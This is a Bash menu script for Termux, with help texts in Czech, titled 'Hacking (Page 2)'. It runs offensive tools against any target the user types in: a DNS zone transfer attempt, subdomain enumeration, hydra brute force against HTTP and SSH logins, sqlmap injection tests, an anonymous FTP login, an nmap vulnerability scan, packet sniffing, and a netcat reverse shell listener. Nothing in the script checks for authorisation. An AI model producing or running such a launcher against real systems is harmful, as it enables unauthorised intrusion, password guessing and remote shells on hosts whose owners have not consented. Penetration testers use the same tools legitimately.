#!/data/data/com.termux/files/usr/bin/bash

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

function hacking_page_2() {
  while true; do
    clear
    echo "Hacking (Page 2)"
    echo
    echo "0) DNS zone transfer test"
    echo "1) Subdomain enumeration"
    echo "2) HTTP brute force"
    echo "3) SQL injection test"
    echo "4) SSH brute force"
    echo "5) FTP anonymous login test"
    echo "6) Vulnerability scan"
    echo "7) Packet sniffing"
    echo "8) Reverse shell listener"
    echo "9) Back to page 1"
    echo
    echo "x) Exit"
    echo "b) Back"
    echo "h#) Help (např. h0)"
    read -p "> " opt

    case $opt in
      0)
        read -p "Domain: " domain
        for ns in $(host -t ns "$domain" | awk '{print $4}'); do
          echo "Testing NS $ns..."
          host -l "$domain" "$ns" | tee "$SCRIPT_DIR/logs/dns_zone_${domain}_$(date +%F).log"
        done
        read -p "Stiskni enter pro pokračování..."
        ;;
      1)
        read -p "Domain: " domain
        subfinder -d "$domain" | tee "$SCRIPT_DIR/logs/subdomains_${domain}_$(date +%F).log"
        read -p "Stiskni enter pro pokračování..."
        ;;
      2)
        read -p "URL (https://...): " url
        read -p "Username wordlist: " users
        read -p "Password wordlist: " pass
        hydra -L "$users" -P "$pass" "$url" http-get | tee "$SCRIPT_DIR/logs/http_brute_$(date +%F).log"
        read -p "Stiskni enter pro pokračování..."
        ;;
      3)
        read -p "URL: " url
        sqlmap -u "$url" --batch | tee "$SCRIPT_DIR/logs/sqlmap_${url//[^a-zA-Z0-9]/_}_$(date +%F).log"
        read -p "Stiskni enter pro pokračování..."
        ;;
      4)
        read -p "Target IP: " ip
        read -p "Username wordlist: " users
        read -p "Password wordlist: " pass
        hydra -L "$users" -P "$pass" ssh://"$ip" | tee "$SCRIPT_DIR/logs/ssh_brute_${ip}_$(date +%F).log"
        read -p "Stiskni enter pro pokračování..."
        ;;
      5)
        read -p "Target IP: " ip
        ftp -inv "$ip" <<EOF
user anonymous ""
ls
bye
EOF
        read -p "Stiskni enter pro pokračování..."
        ;;
      6)
        read -p "Target IP/domain: " target
        nmap --script vuln "$target" | tee "$SCRIPT_DIR/logs/vuln_scan_${target}_$(date +%F).log"
        read -p "Stiskni enter pro pokračování..."
        ;;
      7)
        read -p "Interface (např. wlan0): " iface
        tcpdump -i "$iface"
        read -p "Stiskni enter pro pokračování..."
        ;;
      8)
        read -p "Port to listen on: " port
        nc -lvnp "$port"
        read -p "Stiskni enter pro pokračování..."
        ;;
      9)
        bash "$SCRIPT_DIR/h1.sh"
        return
        ;;
      h0)
        echo -e "\n[HELP 0] DNS Zone Transfer Test"
        echo "- Pokusí se získat kompletní DNS zónu domény pomocí AXFR požadavku"
        echo "- Cíl musí mít špatně nastavený nameserver"
        read -p "Stiskni enter..."
        ;;
      h1)
        echo -e "\n[HELP 1] Subdomain Enumeration"
        echo "- Hledá subdomény zadané domény (např. admin.example.com)"
        echo "- Využívá nástroj subfinder nebo podobný"
        read -p "Stiskni enter..."
        ;;
      h2)
        echo -e "\n[HELP 2] HTTP Brute Force"
        echo "- Pokouší se hádat přihlašovací údaje na webu"
        echo "- Využívá Hydra s wordlisty uživatelů a hesel"
        read -p "Stiskni enter..."
        ;;
      h3)
        echo -e "\n[HELP 3] SQL Injection Test"
        echo "- Testuje zranitelnost webu na SQL injection"
        echo "- Používá sqlmap s automatickou detekcí"
        read -p "Stiskni enter..."
        ;;
      h4)
        echo -e "\n[HELP 4] SSH Brute Force"
        echo "- Pokouší se hádat hesla pro SSH přístup"
        echo "- Používá Hydra, potřebuje wordlist uživatelů a hesel"
        read -p "Stiskni enter..."
        ;;
      h5)
        echo -e "\n[HELP 5] FTP Anonymous Login Test"
        echo "- Zkouší se přihlásit na FTP server bez hesla"
        echo "- Pokud úspěšné, může zobrazit a stáhnout soubory"
        read -p "Stiskni enter..."
        ;;
      h6)
        echo -e "\n[HELP 6] Vulnerability Scan"
        echo "- Skenuje cílový systém na známé zranitelnosti pomocí nmap NSE skriptů"
        echo "- Výsledek uložen do logu"
        read -p "Stiskni enter..."
        ;;
      h7)
        echo -e "\n[HELP 7] Packet Sniffing"
        echo "- Zachytává síťovou komunikaci na zadaném rozhraní"
        echo "- Používá tcpdump, může vyžadovat root práva"
        read -p "Stiskni enter..."
        ;;
      h8)
        echo -e "\n[HELP 8] Reverse Shell Listener"
        echo "- Otevře port pro příjem reverse shellu od cíle"
        echo "- Používá nc (netcat)"
        read -p "Stiskni enter..."
        ;;
      x|X)
        exit 0
        ;;
      b|B)
        return
        ;;
      *)
        echo "Neplatná volba"
        sleep 1
        ;;
    esac
  done
}

hacking_page_2
